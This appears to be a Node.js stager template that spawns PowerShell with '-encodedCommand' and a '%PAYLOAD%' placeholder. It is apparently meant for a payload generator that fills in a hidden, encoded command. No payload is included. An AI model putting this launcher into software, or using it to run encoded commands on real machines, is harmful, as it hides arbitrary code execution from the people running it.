child = require('child_process').execFile
executablePath = "%POWERSHELL%"
child(executablePath, ['-encodedCommand', '%PAYLOAD%'], function(err, data) {

})